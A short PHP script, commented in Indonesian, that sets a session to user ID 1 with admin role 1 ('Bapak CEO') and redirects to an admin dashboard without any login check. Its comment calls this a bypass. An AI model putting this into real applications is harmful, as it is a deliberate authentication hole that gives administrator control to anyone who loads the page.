<?php
session_start();

// Bypass: Langsung memberikan hak akses Admin (Role 1) tanpa perlu form login
$_SESSION['iduser'] = 1; 
$_SESSION['username'] = 'Bapak CEO'; 
$_SESSION['idrole'] = 1; 

// Langsung arahkan ke dashboard admin
echo "<script>window.location='dashboard_admin.php';</script>";
exit;
?>